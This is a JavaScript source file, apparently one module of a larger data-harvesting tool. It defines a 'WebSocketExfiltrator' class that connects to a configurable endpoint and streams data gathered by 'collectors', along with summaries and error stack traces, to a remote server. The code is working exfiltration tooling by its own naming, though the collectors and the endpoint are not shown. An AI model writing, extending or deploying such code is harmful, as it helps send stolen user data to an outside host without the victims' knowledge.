// exfiltrators/websocket.js

export class WebSocketExfiltrator {
    constructor(endpoint) {
        this.endpoint = endpoint;
        this.socket = null;
        this.reconnectAttempts = 0;
        this.maxReconnectAttempts = 5;
        this.name = 'WebSocket';
    }

    async connect() {
        return new Promise((resolve, reject) => {
            try {
                this.socket = new WebSocket(this.endpoint);
                
                this.socket.onopen = () => {
                    console.debug('WebSocket connected');
                    this.reconnectAttempts = 0;
                    resolve(true);
                };
                
                this.socket.onerror = (error) => {
                    console.debug('WebSocket error:', error);
                    reject(error);
                };
            } catch (error) {
                reject(error);
            }
        });
    }

    async sendData(collectorName, data) {
        if (!this.socket || this.socket.readyState !== WebSocket.OPEN) {
            await this.connect();
        }
        
        const message = {
            type: 'data',
            collector: collectorName,
            data: data,
            timestamp: Date.now()
        };
        
        this.socket.send(JSON.stringify(message));
        return true;
    }

    async sendSummary(collectedData) {
        if (!this.socket || this.socket.readyState !== WebSocket.OPEN) {
            await this.connect();
        }
        
        const message = {
            type: 'summary',
            data: collectedData,
            timestamp: Date.now()
        };
        
        this.socket.send(JSON.stringify(message));
        return true;
    }

    async sendError(error) {
        if (!this.socket || this.socket.readyState !== WebSocket.OPEN) {
            await this.connect();
        }
        
        const message = {
            type: 'error',
            error: {
                message: error.message,
                stack: error.stack
            },
            timestamp: Date.now()
        };
        
        this.socket.send(JSON.stringify(message));
        return true;
    }

    disconnect() {
        if (this.socket) {
            this.socket.close();
            this.socket = null;
        }
    }
}